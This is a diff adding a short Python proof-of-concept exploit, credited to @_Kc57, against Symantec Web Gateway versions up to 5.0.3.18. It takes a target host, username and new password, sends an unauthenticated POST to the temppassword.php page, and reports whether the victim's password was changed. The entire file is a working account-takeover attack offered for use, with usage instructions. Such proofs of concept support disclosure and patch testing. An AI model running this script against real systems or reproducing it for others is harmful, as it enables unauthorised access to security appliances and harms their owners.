@@ -1,0 +1,43 @@
+#!/usr/bin/python
+
+import urllib
+import urllib2
+import re
+import sys
+
+print "[*] ###########################################################"
+print "[*] Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change"
+print "[*] @_Kc57"
+print "[*] ###########################################################\n"
+
+
+if (len(sys.argv) != 4):
+	print "Usage: poc.py <RHOST> <username> <newpassword>"
+	exit(0)
+
+ip = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+
+url = "https://%s/spywall/temppassword.php" % (ip)
+
+opts = {
+	'target':'executive_summary.php',
+	'USERNAME':username,
+	'password':password,
+	'password2':password,
+	'Save':'Save'
+}
+
+print "[*] Sending request to server..."
+
+data = urllib.urlencode(opts)
+request = urllib2.Request(url, data)
+response = urllib2.urlopen(request)
+
+match = re.search('Your new password has been saved', response.read())
+
+if(match):
+	print "[*] Password for %s changed to %s" %(username,password)
+else:
+	print "[*] Password change failed!"
